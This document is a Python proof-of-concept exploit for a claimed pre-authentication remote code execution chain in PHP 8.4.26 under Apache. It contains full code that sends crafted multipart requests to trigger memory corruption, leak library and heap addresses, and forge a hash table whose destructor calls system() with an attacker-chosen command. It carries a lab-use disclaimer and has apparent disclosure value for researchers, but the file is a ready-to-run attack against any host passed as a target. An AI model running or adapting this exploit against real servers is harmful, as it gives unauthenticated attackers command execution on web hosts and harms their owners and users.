#!/usr/bin/env python3
"""Php2Shell PoC - CVE-2026-109618 / CVE-2026-109619

Pre-auth RCE on stock php:8.4.26-apache (php.ini-production).

Chain:
  A1  send_cookie OOM inside rfc1867 END cleanup
  B1  stale-id OOB read -> libphp base + main chunk leak
  A2  cheap-OOM -> dangling PS(hash_serialize_verifier)
  B2  fake reference + fake zend_array (pDestructor=zif_system)
      -> zend_hash_destroy at shutdown calls system(cmd)

Authorized lab use only. Do not run against systems you do not own.

Usage:
  python php2shell_poc.py
  python php2shell_poc.py --cmd "pwd>/out/p1"
  python php2shell_poc.py --port 8080 --container Php2Shell

Based on the public exploit in 9bie/php2shell-bypass-aslr-exp.
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import subprocess
import sys
import time
import urllib.parse
from collections import Counter

HOST = "127.0.0.1"
QUERY = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
BOUNDARY = b"C" * 10

# php:8.4.26-apache (official image, x86-64) offsets
ZVAL_PTR_DTOR = 0x65EB60
ZIF_SYSTEM = 0x465370
S_OFF = 0xF8398
MAIN_BUCKET_COUNT = 87
DELTA_MIN, DELTA_MAX = 0x1A00000, 0x1F00000

LEAK_SPEC = [("G", 511, 0x137)] * 14 + [
    ("G", 400, 0x137), ("G", 511, 0x137), ("X", 900, 0),
]
FAKE_LEN = 0xC8000


def http_post(body, path, port, chunked, timeout, cap=4 << 20):
    te = ("Transfer-Encoding: chunked\r\n" if chunked
          else "Content-Length: %d\r\n" % len(body))
    req = (
        "POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n%s"
        "Connection: close\r\n\r\n"
        % (path, HOST, port, BOUNDARY.decode(), te)
    ).encode()

    if chunked:
        for i in range(0, len(body), 65536):
            piece = body[i:i + 65536]
            req += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
        req += b"0\r\n\r\n"
    else:
        req += body

    resp = bytearray()
    s = socket.create_connection((HOST, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req)
        while len(resp) < cap:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp.extend(chunk)
    except OSError:
        pass
    finally:
        s.close()
    return bytes(resp)


def http_get(path, port, timeout=5.0):
    out = bytearray()
    s = socket.create_connection((HOST, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(("GET %s HTTP/1.0\r\nHost: x\r\n\r\n" % path).encode())
        out.extend(s.recv(4096))
    except OSError:
        pass
    finally:
        s.close()
    return bytes(out)


def part(name, value=b"", filename=None, ctype=None):
    out = b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        out += b'; filename="' + filename + b'"'
    out += b"\r\n"
    if ctype is not None:
        out += b"Content-Type: " + ctype + b"\r\n"
    return out + b"\r\n" + value + b"\r\n"


def nest_name(i, depth, key_pad=0):
    return (("files[R%05d%s]" % (i, "K" * key_pad)).encode()
            + b"[a]" * (depth - 2))


def build_a1():
    out = bytearray()
    out += part(b"PHPSESSID", b"\x00")
    for i in range(860):
        ctype = (b"C" * 103 if i == 0
                 else b"C" * 231 if i == 1
                 else b"application/octet-stream")
        fn = b"A" if i in (0, 1) else b""
        out += (b"--" + BOUNDARY
                + b'\r\nContent-Disposition: form-data; name="'
                + nest_name(i, 64, 90) + b'"; filename="' + fn + b'"'
                + b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(14):
        out += part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(78):
        out += part(("b%04d" % i).encode(), b"B" * 8000)
    for i in range(20):
        out += part(("u%02d" % i).encode(), b"U" * 4000)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 4000)
    return bytes(out + b"--" + BOUNDARY + b"--\r\n")


def tag8(idx):
    return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"


def forge_fill_value(pages, page, fake_len):
    length = pages * 4096 - 25
    v = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    struct.pack_into("<I", v, hdr + 0x00, 0)
    struct.pack_into("<I", v, hdr + 0x04, 0x16)
    struct.pack_into("<Q", v, hdr + 0x08, 0)
    struct.pack_into("<Q", v, hdr + 0x10, fake_len)
    v[hdr + 0x18:hdr + 0x18 + 8] = tag8(0)
    return bytes(v)


def build_leak_b():
    out = bytearray()
    out += part(b"PHPSESSID", b"a")
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    idx = 0
    for kind, a, b in LEAK_SPEC:
        if kind == "X":
            for _ in range(a):
                out += part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        v = forge_fill_value(a, b, FAKE_LEN)
        out += part((b"f%04d" % idx).ljust(120, b"f")[:120], v)
        idx += 1
    return bytes(out + b"--" + BOUNDARY + b"--\r\n")


def build_a2():
    out = bytearray()
    out += part(b"PHPSESSID", b"a" * 32)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(115):
        out += part(("%03d" % i).encode(), b"x")
    for i in range(880):
        out += (b"--" + BOUNDARY
                + b'\r\nContent-Disposition: form-data; name="'
                + nest_name(i, 64) + b'"; filename=""'
                + b"\r\nContent-Type: application/octet-stream\r\n\r\n")
    return bytes(out + b"--" + BOUNDARY + b"--\r\n")


def build_ht(htdata, zif, cmd):
    ht = bytearray(384)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    return bytes(ht)


def build_b2(ht, s_addr):
    v = bytearray(b"S" * 384)
    o = 8
    while o + 32 <= 384:
        struct.pack_into("<I", v, o, 1)
        v[o + 4] = 0x0A
        struct.pack_into("<Q", v, o + 8, s_addr)
        struct.pack_into("<I", v, o + 16, 0x0107)
        o += 32

    def nm(prefix, i):
        return (prefix + ("%09d" % i).encode())[:10]

    out = bytearray()
    for i in range(500):
        out += part(nm(b"s", i), bytes(v))
    out += part(b"ht", ht)
    out += part(b"PHPSESSID", b"a" * 32)
    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(495):
        out += part(nm(b"t", i), bytes(v))
    return bytes(out + b"--" + BOUNDARY + b"--\r\n")


def parse_leak(resp):
    marker = b"Set-Cookie: PHPSESSID="
    i = resp.find(marker)
    if i < 0:
        raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
    val = resp[i + len(marker):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))

    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x500000000000 <= q <= 0x800000000000:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")

    zdtor, _ = counts.most_common(1)[0]
    lib = zdtor - ZVAL_PTR_DTOR

    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]

    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))

    return {
        "decoded": len(dec),
        "zdtor": zdtor,
        "lib": lib,
        "buckets": buckets,
        "main_candidates": [b for b, _ in cands[:3]],
    }


_DOCKER = None


def docker_cmd():
    global _DOCKER
    if _DOCKER is None:
        for cand in (["docker"], ["sudo", "docker"]):
            try:
                r = subprocess.run(
                    cand + ["version"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    timeout=30,
                )
                if r.returncode == 0:
                    _DOCKER = cand
                    break
            except (OSError, subprocess.TimeoutExpired):
                continue
        if _DOCKER is None:
            _DOCKER = []
    return _DOCKER


def read_proof(container):
    local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "out", "p1")
    try:
        with open(local) as f:
            data = f.read().strip()
            if data:
                return data
    except OSError:
        pass

    dc = docker_cmd()
    if dc:
        try:
            r = subprocess.run(
                dc + ["exec", container, "cat", "/out/p1"],
                capture_output=True, timeout=30,
            )
            if r.returncode == 0:
                return r.stdout.decode("utf-8", "replace").strip()
        except (OSError, subprocess.TimeoutExpired):
            pass
    return ""


def run(port, cmd, retries, restart, container, timeout):
    for attempt in range(1, retries + 1):
        if restart:
            dc = docker_cmd()
            if not dc:
                print("no usable docker command for --restart")
                return 1
            subprocess.run(dc + ["restart", restart], check=True,
                           stdout=subprocess.DEVNULL)
            time.sleep(1.2)

        http_get("/index.php", port)

        print("[try %d] A1: END-cleanup send_cookie OOM" % attempt)
        r = http_post(build_a1(), "/index.php" + QUERY, port,
                      chunked=True, timeout=180)
        if b"500" not in r.split(b"\r\n", 1)[0][:30]:
            print("      warning: A1 status %r" % r.split(b"\r\n", 1)[0][:40])
        time.sleep(0.2)

        print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
        try:
            info = parse_leak(http_post(build_leak_b(), "/index.php", port,
                                        chunked=True, timeout=timeout))
        except Exception as exc:
            print("      leak failed: %r" % (exc,))
            continue

        print("      decoded=%d zval_ptr_dtor=%#x -> libphp=%#x" % (
            info["decoded"], info["zdtor"], info["lib"]))
        print("      chunk buckets: %s" % [
            (hex(b), c) for b, c in info["buckets"].most_common(6)])

        if not info["main_candidates"]:
            print("      no main-chunk candidate")
            continue

        delta = info["lib"] - info["main_candidates"][0]
        if not (DELTA_MIN <= delta <= DELTA_MAX):
            print("      implausible libphp-main delta %#x; re-leak" % delta)
            continue

        zif = info["lib"] + ZIF_SYSTEM
        for cand in info["main_candidates"]:
            s_addr = cand + S_OFF
            print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x" % (
                attempt, cand, s_addr, zif))

            http_post(build_a2(), "/index.php", port,
                      chunked=False, timeout=120)
            time.sleep(0.2)

            ht = build_ht(s_addr, zif, cmd)
            http_post(build_b2(ht, s_addr), "/index.php", port,
                      chunked=False, timeout=120)

            for _ in range(6):
                time.sleep(0.5)
                proof = read_proof(container)
                if proof:
                    print("[4/4] RCE OK:")
                    print(proof)
                    return 0

            print("      candidate failed (no proof)")

    print("[4/4] all attempts failed")
    return 1


def main():
    global HOST

    ap = argparse.ArgumentParser(
        description="Php2Shell PoC - CVE-2026-109618 / CVE-2026-109619 "
                    "(authorized lab use only)")
    ap.add_argument("--host", default=HOST,
                    help="target host (default: 127.0.0.1)")
    ap.add_argument("--port", type=int, default=80,
                    help="target port (default: 80)")
    ap.add_argument("--cmd", default="id>/out/p1",
                    help="command to execute (output must go to /out/p1)")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--restart", default="",
                    help="container name to restart before each attempt")
    ap.add_argument("--container", default="Php2Shell",
                    help="container used to read the proof file")
    ap.add_argument("--timeout", type=float, default=600.0)
    args = ap.parse_args()

    HOST = args.host
    cmd = args.cmd.encode()

    if b">/out/" not in cmd:
        cmd += b">/out/p1"

    if len(cmd) > 0x160 - 0x98:
        print("command too long for the 384-byte carrier", file=sys.stderr)
        return 2

    return run(args.port, cmd, args.retries, args.restart,
               args.container, args.timeout)


if __name__ == "__main__":
    raise SystemExit(main())